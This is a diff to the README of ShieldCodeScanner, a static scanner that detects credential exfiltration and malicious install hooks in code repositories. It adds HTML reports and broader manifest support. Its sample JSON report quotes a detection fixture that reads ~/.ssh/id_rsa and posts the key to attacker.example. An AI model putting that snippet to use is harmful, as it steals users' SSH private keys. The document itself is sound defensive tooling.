@@ -9,7 +9,7 @@ It does **not** decide that a repository is malicious.
 
 [![Python 3.9+](https://img.shields.io/badge/python-3.9%2B-3776AB?logo=python&logoColor=white)](#requirements)
 [![stdlib only](https://img.shields.io/badge/deps-stdlib%20only-success)](#requirements)
-[![CI](https://img.shields.io/badge/CI-unittest-2088FF?logo=githubactions&logoColor=white)](.github/workflows/ci.yml)
+[![CI](https://github.com/schiessti-afk/ShieldCodeScanner/actions/workflows/ci.yml/badge.svg)](https://github.com/schiessti-afk/ShieldCodeScanner/actions/workflows/ci.yml)
 [![SARIF 2.1.0](https://img.shields.io/badge/SARIF-2.1.0-orange)](#diff-mode-and-sarif)
 [![License: MIT](https://img.shields.io/badge/license-MIT-green)](LICENSE)
 
@@ -39,13 +39,13 @@ No URL is fetched. No scanned file is imported, compiled, or run.
 
 ## Features
 
-| | |
+| Capability | Details |
 | --- | --- |
 | **Python AST taint** | `from os import getenv`, `self.token = ...`, `subprocess.run(cmd, **{"shell": True})` — not just `os.getenv(` on one line |
-| **Structured manifests** | Real `json` / `tomllib` walks of `package.json` and `pyproject.toml` (scripts, Husky, PDM, Poe, Hatch). Minified files still parse |
+| **Structured manifests** | Real `json` / `tomllib` walks of `package.json` and `pyproject.toml` (scripts, Husky, PDM, Poe, Taskipy, Hatch, Poetry). Minified files still parse |
 | **Incidents** | Cluster by taint source. Chain: credential read → transform → sink. Destination tagged from literals only |
 | **Cross-file flow** | Static export/import index. A getter in `secrets.py` can taint a POST in `sync.py` |
-| **CI-ready** | Deterministic JSON, SARIF 2.1.0, committed baseline, `--since` diff mode, inline `# code-scanner: ignore` |
+| **CI-ready** | Deterministic JSON, SARIF 2.1.0, HTML report, committed baseline, `--since` diff mode, inline `# code-scanner: ignore` |
 | **Safe by construction** | Stdlib only. Bounded reads. Binaries skipped. One bad file cannot abort the scan |
 
 ```mermaid
@@ -60,7 +60,7 @@ flowchart LR
   F --> G
   G --> H[Combo / direct rules]
   H --> I[Incidents + destination]
-  I --> J[JSON or SARIF]
+  I --> J[JSON, SARIF, or HTML]
 ```
 
 ---
@@ -102,11 +102,18 @@ Findings require human verification.
 python scanner.py /path/to/project
 python scanner.py /path/to/project --output report.json
 python scanner.py /path/to/project --format sarif --output report.sarif
+python scanner.py /path/to/project --format html --output report.html --open
 python scanner.py /path/to/project --baseline scanner-baseline.json
 python scanner.py /path/to/project --update-baseline
 python scanner.py /path/to/project --since origin/main --format sarif --output report.sarif
 python scanner.py /path/to/project --verbose
 ```
+
+After `pip install .` the same CLI is available as `code-scanner`.
+
+`--format html` writes a self-contained browser report. Without `--output`, the
+default file name is `shield-report.html` in the current directory. Use
+`--open` to launch it in the default browser after the scan.
 
 `--verbose` diagnostics go to stderr so stdout stays machine-readable.
 
@@ -130,6 +137,13 @@ ever contained `curl \| sh`.”
 Reviewers should read **`incidents`**. Each one is one story. `findings`
 stay in the report so baselines, SARIF, and suppressions keep working.
 
+For a browser-friendly summary, use `--format html`. The page leads with
+incidents (chain steps and destination hints), then lists individual findings
+with escaped code snippets. It is one file with inline CSS and no JavaScript.
+
+Abbreviated example (file counts are illustrative; the finding matches
+`tests/fixtures/true_positives/exfil_ssh.py`):
+
 ```json
 {
   "status": "flagged",
@@ -142,7 +156,7 @@ stay in the report so baselines, SARIF, and suppressions keep working.
       "line": 8,
       "pattern": "sensitive_file_exfiltration",
       "severity": "critical",
-      "description": "Suspicious credential exfiltration pattern detected: ...",
+      "description": "Suspicious credential exfiltration pattern detected: contents of a sensitive credential file appear to be transmitted over the network.",
       "code_snippet": "with open(os.path.expanduser(\"~/.ssh/id_rsa\")) as fh:\n    key = fh.read()\nrequests.post(\"https://attacker.example/keys\", data=key)",
       "source_line": 7,
       "source_kind": "sensitive_file",
@@ -150,14 +164,14 @@ stay in the report so baselines, SARIF, and suppressions keep working.
       "destination": "remote_host",
       "destination_hint": "attacker.example",
       "flow": [
-        "exfil_ssh.py:6 credential read",
+        "exfil_ssh.py:7 credential read",
         "exfil_ssh.py:8 network sink"
       ]
     }
   ],
   "incidents": [
     {
-      "id": "8e5d01fd6cde",
+      "id": "e4e8dc66c8b1",
       "severity": "critical",
       "pattern": "sensitive_file_exfiltration",
       "file": "exfil_ssh.py",
@@ -171,7 +185,8 @@ stay in the report so baselines, SARIF, and suppressions keep working.
         "sensitive_file_exfiltration"
       ],
       "destination": "remote_host",
-      "destination_hint": "attacker.example"
+      "destination_hint": "attacker.example",
+      "description": "Suspicious credential exfiltration pattern detected: contents of a sensitive credential file appear to be transmitted over the network."
     }
   ]
 }
@@ -206,17 +221,22 @@ Code extensions: `.py`, `.js`, `.ts`, `.jsx`, `.tsx`, `.sh`, `.bash`,
 `.zsh`, `.rb`, `.go`, `.rs`, `.swift`, `.bat`, `.cmd`, `.ps1`, `.vbs`.
 
 Important names and config extensions such as `package.json`,
-`pyproject.toml`, `requirements.txt`, `Dockerfile`, `.env`, `.env.*`,
-`*.yml`, `*.json`, and `*.toml` are also inspected.
+`pyproject.toml`, `requirements.txt`, `Dockerfile`, `Makefile`,
+`docker-compose.yml`, `.env`, `.env.*`, `*.yml`, `*.yaml`, `*.json`,
+`*.toml`, `*.ini`, `*.cfg`, and `*.conf` are also inspected.
 
-`scanner-baseline.json` is not scanned. These directories are skipped
-entirely (edit `SKIP_DIRECTORIES` in `utils.py` to extend the list):
+`scanner-baseline.json` is not scanned. These **directory** names are
+skipped entirely (edit `SKIP_DIRECTORIES` in `utils.py` to extend the
+list):
 
 `.git`, `node_modules`, `venv`, `.venv`, `env`, `.env`, `__pycache__`,
 `.pytest_cache`, `.mypy_cache`, `.tox`, `dist`, `build`, `target`,
 `vendor`, `coverage`.
 
-Default maximum file size is 5 MB (`--max-file-size` overrides).
+A file named `.env` or `.env.*` is still scanned; only a directory
+named `.env` is skipped.
+
+Default maximum file size is 5 MB (`--max-file-size` takes bytes).
 
 ---
 
@@ -268,9 +288,9 @@ client.post(url, data=key)
 `package.json` is `json.loads`, then scripts **and** tool hooks
 (`husky.hooks`, `simple-git-hooks`, `lint-staged`, `config.ghooks`).
 `pyproject.toml` is `tomllib` (or a subset parser on 3.9–3.10), then
-`tool.pdm.scripts`, `tool.poe.tasks`, `tool.taskipy.tasks`, and Hatch
-env scripts. A minified one-line `package.json` is still a document, not
-a regex target.
+`tool.pdm.scripts`, `tool.poe.tasks`, `tool.taskipy.tasks`, Hatch env
+scripts, and Poetry scripts that look like shell. A minified one-line
+`package.json` is still a document, not a regex target.
 
 ### Incidents: one story per taint source
 
@@ -395,12 +415,15 @@ CI runs the same command on Python 3.9 and 3.12
 ├── utils.py        # traversal, binary detection, snippets
 ├── baseline.py     # fingerprints, ignore comments, --since
 ├── sarif.py        # SARIF 2.1.0 renderer
+├── html_report.py  # self-contained HTML report renderer
 ├── tests/
 │   ├── test_scanner.py
+│   ├── test_html_report.py
 │   ├── test_baseline_ci.py
 │   ├── test_ast_incidents.py
 │   └── fixtures/
-│       ├── malicious/
+│       ├── README.md
+│       ├── true_positives/
 │       └── benign/
 ├── .github/workflows/ci.yml
 ├── README.md
